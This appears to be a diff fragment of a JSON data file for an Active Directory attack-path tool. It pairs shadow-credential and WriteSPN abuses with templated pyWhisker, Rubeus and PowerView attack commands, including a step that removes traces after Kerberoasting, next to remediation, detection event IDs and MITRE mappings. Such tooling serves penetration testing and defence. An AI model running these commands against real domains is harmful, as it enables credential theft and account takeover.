+                "command": "python3 pywhisker.py -d '{{DOMAIN}}' -u '{{SOURCE}}' -p 'password' --target '{{TARGET}}' --action add",
+                "explanation": "Add shadow credentials using pyWhisker"
+            },
+            {
+                "title": "Authenticate with Certificate",
+                "tool": "Rubeus",
+                "command": "Rubeus.exe asktgt /user:{{TARGET}} /certificate:cert.pfx /password:password /ptt",
+                "explanation": "Request TGT using generated certificate"
+            }
+        ],
+        "traversable": true
+    },
+    "WriteSPN": {
+        "description": "Principal can modify servicePrincipalName attribute, enabling targeted Kerberoasting",
+        "abuse": "Add SPN to target user account to make it Kerberoastable, then crack offline",
+        "opsec": "Low-Medium",
+        "remediation": "Restrict write access to servicePrincipalName, monitor SPN additions on user accounts",
+        "remediation_steps": [
+            "Remove write permissions to servicePrincipalName",
+            "Monitor SPN additions on user accounts (unusual)",
+            "Enforce strong passwords on all accounts"
+        ],
+        "mitre_mapping": ["T1558.003"],
+        "detection_event_ids": [
+            {"id": "5136", "description": "servicePrincipalName modified"},
+            {"id": "4769", "description": "Kerberos service ticket request"}
+        ],
+        "powershell_remediation": "Set-ADUser -Identity '{{TARGET}}' -ServicePrincipalNames @{Remove='fake/spn'}",
+        "command_templates": [
+            {
+                "title": "Add SPN for Kerberoasting",
+                "tool": "PowerView",
+                "command": "Set-DomainObject -Identity '{{TARGET}}' -Set @{serviceprincipalname='fake/spn'}",
+                "explanation": "Add SPN to {{TARGET}} to enable Kerberoasting"
+            },
+            {
+                "title": "Kerberoast the Target",
+                "tool": "Rubeus",
+                "command": "Rubeus.exe kerberoast /user:{{TARGET}}",
+                "explanation": "Request TGS ticket for cracking"
+            },
+            {
+                "title": "Remove SPN After Attack",
+                "tool": "PowerView",
+                "command": "Set-DomainObject -Identity '{{TARGET}}' -Clear serviceprincipalname",
+                "explanation": "Clean up by removing the added SPN"
+            }
+        ],
+        "traversable": true
+    }
+}
